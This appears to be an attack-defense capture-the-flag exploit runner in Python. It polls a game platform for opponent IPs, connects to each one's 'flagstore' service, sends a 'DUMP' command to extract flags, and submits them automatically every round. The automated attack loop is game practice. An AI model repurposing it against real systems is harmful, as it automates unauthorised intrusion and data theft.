#!/usr/bin/env python3
import os
import re
import typing
import traceback
import aiohttp
import asyncio
from pwn import remote
from fake_useragent import UserAgent
from flags import validate_flag, Ed25519PublicKey, load_key, FLAG_RE

HTTP_PORT = 5000
TICK_SECONDS = 60
USER = UserAgent()


class TeamStatus(typing.TypedDict):
    ip: str
    vulns: dict[
        str, list[str]  # vuln index as a string ('0', '1', ...) -> [flag id, ...]
    ]


class AttackData(typing.TypedDict):
    round: int
    flag_accepted_rounds: int
    teams: dict[str, TeamStatus]  # team id -> per-team attack info


class SubmitResult(typing.TypedDict):
    flag: str
    accepted: bool
    status: int
    message: str


def _retry_after(resp: aiohttp.ClientResponse, default: float = 2.0) -> float:
    value = resp.headers.get("Retry-After")
    try:
        return float(value) if value else default
    except ValueError:
        return default


class FlagStore:
    def __init__(self, path: str) -> None:
        self.path = path
        self._seen: set[str] = set()
        self._lock = asyncio.Lock()

    def load(self) -> None:
        directory = os.path.dirname(self.path)
        if directory:
            os.makedirs(directory, exist_ok=True)
        try:
            with open(self.path, "r", encoding="utf-8") as f:
                self._seen.update(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            pass
        print(f"loaded {len(self._seen)} submitted flags from {self.path}", flush=True)

    def __contains__(self, flag: str) -> bool:
        return flag in self._seen

    async def add(self, flag: str) -> None:
        async with self._lock:
            if flag in self._seen:
                return
            self._seen.add(flag)
            with open(self.path, "a", encoding="utf-8") as f:
                f.write(flag + "\n")


class Submitter:
    def __init__(self) -> None:
        # exploit runner injects these env vars by default
        self.base = os.environ.get("PLATFORM_URL", "http://127.0.0.1:8888").rstrip("/")
        self.service_id = int(os.environ.get("SERVICE_ID", "0"))
        self.team_id = int(os.environ.get("TEAM_ID", "0"))
        token = os.environ.get("PLATFORM_TOKEN")

        self._headers = {}
        if token:
            self._headers["Authorization"] = "Bearer " + token
        self._session: aiohttp.ClientSession | None = None
        self.key: Ed25519PublicKey
        self.submitted = FlagStore(
            os.environ.get("PERSIST_PATH", "/data/submitted_flags.txt")
        )

    async def __aenter__(self) -> "Submitter":
        self.submitted.load()
        self._session = aiohttp.ClientSession(
            headers=self._headers,
            timeout=aiohttp.ClientTimeout(total=15),
        )
        return self

    async def __aexit__(self, *exc: object) -> None:
        if self._session is not None:
            await self._session.close()

    async def attack_data(self, service_id: int | None = None) -> AttackData:
        sid = self.service_id if service_id is None else service_id
        async with self._session.get(f"{self.base}/ad/{sid}/attack") as r:
            r.raise_for_status()
            return await r.json()

    async def submit_flag(self, flag: str, *, retries: int = 50) -> SubmitResult:
        for attempt in range(retries + 1):
            try:
                async with self._session.post(
                    f"{self.base}/ad/flag", data=flag.encode()
                ) as r:
                    message = (await r.text()).strip()
                    if r.status == 429 and attempt < retries:
                        delay_n = _retry_after(r)
                        print(
                            f"ratelimited while submitting {flag=}, sleeping for {delay_n=}",
                            flush=True,
                        )
                        await asyncio.sleep(delay_n)
                        continue
                    return SubmitResult(
                        flag=flag,
                        accepted=r.status == 200,
                        status=r.status,
                        message=message,
                    )
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                return SubmitResult(
                    flag=flag, accepted=False, status=0, message=f"error: {e}"
                )
        return SubmitResult(
            flag=flag, accepted=False, status=429, message="rate limited"
        )

    async def submit_flags(self, flags: typing.Iterable[str]) -> list[SubmitResult]:
        results: list[SubmitResult] = []
        for flag in flags:
            result = await self.submit_flag(flag)
            results.append(result)
            if result["status"] not in (0, 429):
                await self.submitted.add(flag)
        return results

    async def cache_key(self) -> None:
        async with self._session.get(f"{self.base}/key") as r:
            self.key = load_key(await r.read())


async def attack(
    sub: Submitter, team_id: int, min_round_id: int, team_status: TeamStatus
) -> None:
    print(f"attack {team_id=} {min_round_id=} {team_status=}")
    r = remote(team_status["ip"], 7777)
    r.sendlineafter(b"flagstore> ", b"DUMP")
    d = r.recvuntil(b"\r\nEND\r\nflagstore> ")
    r.close()

    to_submit: list[str] = []
    seen: set[str] = set()
    for flag_match in re.finditer(FLAG_RE, d.decode("utf-8", errors="replace")):
        flag = flag_match.group(0)
        if flag in seen or flag in sub.submitted:
            continue

        seen.add(flag)
        try:
            ok, round, service_id, flag_team_id = validate_flag(flag, sub.key)
        except Exception:
            print(f"unable to decode {flag=}", flush=True)
            continue

        if not ok:
            print(f"flag is not ok {flag=}", flush=True)
            continue

        if (
            round < min_round_id
            or service_id != sub.service_id
            or team_id != flag_team_id
        ):
            print(
                f"flag is too old or invalid otherwise {flag=} {service_id=} {team_id=} {sub.service_id=} {flag_team_id=} {round=} {min_round_id}",
                flush=True,
            )
            continue

        to_submit.append(flag)

    print("submitting", to_submit, flush=True)
    if not to_submit:
        return

    print(await sub.submit_flags(to_submit))


# TODO(players): timeouts, parallelization, any other fancy stuff you want
async def run_round(sub: Submitter) -> None:
    print("running round", flush=True)

    await sub.cache_key()
    data = await sub.attack_data()
    for target, vuln_data in data["teams"].items():
        print(f"attacking {target=} {vuln_data=}", flush=True)
        if target == str(sub.team_id):
            print("we are not attacking ourselves", flush=True)
            continue

        try:
            await attack(
                sub,
                int(target),
                data["round"] - data["flag_accepted_rounds"],
                vuln_data,
            )
        except Exception:
            traceback.print_exc()


async def main() -> None:
    async with Submitter() as sub:
        while True:
            try:
                await run_round(sub)
            except Exception:
                traceback.print_exc()
            await asyncio.sleep(TICK_SECONDS)


if __name__ == "__main__":
    asyncio.run(main())
